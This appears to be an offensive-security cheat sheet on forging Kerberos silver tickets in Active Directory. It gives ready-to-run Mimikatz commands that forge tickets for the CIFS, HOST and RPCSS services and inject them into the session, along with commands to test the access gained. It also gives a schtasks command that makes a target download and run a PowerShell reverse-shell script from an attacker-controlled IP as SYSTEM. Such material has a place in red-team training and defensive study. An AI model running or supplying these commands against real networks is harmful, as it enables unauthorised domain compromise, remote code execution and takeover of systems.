# 🥈 Silver Tickets

### **Make silver ticket for CIFS**

Use the hash of the local computer

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
```

### **Check access (After CIFS silver ticket)**

```
ls \\<servername>\c$\
```

### **Make silver ticket for Host**

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
```

### **Schedule and execute a task (After host silver ticket)**

```
schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <target> /TN “Reverse”
```

### **Make silver ticket for WMI**

Execute for WMI /service:HOST /service:RPCSS

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
```

### **Check WMI Permission**

```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```

### Sources

{% embed url="https://adsecurity.org/?p=2011" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets" %}
